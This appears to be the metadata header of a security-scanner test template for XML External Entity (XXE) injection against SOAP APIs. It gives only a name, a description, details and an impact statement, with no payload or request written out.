info:
  name: "XML External Entity (XXE) test for Basic SOAP API Injection"
  description: >
    "This test involves exploiting vulnerabilities in SOAP APIs by injecting malicious XML payloads, aiming to trigger XXE attacks and potentially gain unauthorized access or extract sensitive information from the target system."
  details: >
    "This test for Basic SOAP API Injection entails manipulating SOAP requests with malicious XML entities, probing for vulnerabilities that, if exploited, could compromise API security and expose critical data within the system."
  impact: >
    "Successful XML External Entity (XXE) test for Basic SOAP API Injection can lead to unauthorized data access, system information disclosure, and potential security breaches within the targeted SOAP API, compromising overall system integrity."
